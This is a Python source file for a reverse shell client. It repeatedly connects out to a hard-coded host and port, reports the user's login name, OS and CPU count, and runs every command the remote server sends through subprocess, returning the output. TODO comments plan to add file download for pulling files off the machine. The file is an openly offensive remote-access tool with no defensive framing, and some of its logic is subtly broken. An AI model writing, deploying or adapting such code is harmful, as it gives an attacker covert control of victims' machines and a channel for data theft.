import socket
import time
import subprocess
import os
from os import (
    chdir,
    getcwd,
    getlogin,
    cpu_count,
)


class Client:
    def __init__(self, address, port):
        self.sock = None
        self.buffer = ''
        self.address, self.port = address, port
        self.create_socket()
        self.connection_handler()
        self.shell_transmission()

    def create_socket(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def set_initial_buffer(self):
        self.buffer = f"Successfully connected to {getlogin()}. \nOperating system : {os.name}. \nNumber of CPU : {cpu_count()} "

    def send_data_to_server(self, data):
        self.sock.sendall(data) if type(data) == bytes else self.sock.sendall(data.encode('utf-8'))

    def connection_handler(self):
        """
            Tries to connect to the Server each N seconds then calls the shell function
        """
        time.sleep(2)
        print('[+] Trying to connect...')
        while True:
            try:
                self.sock.connect((self.address, self.port))
                print("[+] Connection established")
                self.set_initial_buffer()
                break
            except ConnectionRefusedError as e:
                print(f'[{e.errno}] Couldn\'t connect to host.')
                self.connection_handler()
            except PermissionError as e:
                print(f'[{e.errno}] Connection with host interrupted by the host.')
            except OSError as e:
                print(f'[{e.errno}] Already connected to host.')


    def command_handler(self, command):
        try:
            if command.startswith('cd') or command.startswith('chdir'):
                directory_path = command.split(maxsplit=1)[1]
                chdir(directory_path)
                return f'Current directory : {getcwd()}'
            elif command == 'exit':
                return 'exit'

        except FileNotFoundError as e:
            return f'[{e.errno}] No such file or directory "{directory_path}"'

    def shutdown_communication(self):
        pass


    def shell_transmission(self):
        """
            Listen to the commands made by the Server.
        """
        self.send_data_to_server(self.buffer)
        while True:
            data = self.sock.recv(1024)
            command = data.decode('utf-8')

            shell_result = subprocess.run(
                command.split(' '),
                capture_output=True,
                check=True
            )
            if shell_result.returncode == 0:
                self.send_data_to_server(shell_result.stdout)
            else:
                self.send_data_to_server(shell_result.stderr)





def main():
    address, port = 'benju', 23164
    Client(address, port)


if __name__ == '__main__':
    main()


# TODO create a "download" command that read the file if it exists and send it in bytes
# TODO The server side must take the response and write the response in the new file
# TODO with open(directory_path, 'rb' and also 'wb')
# TODO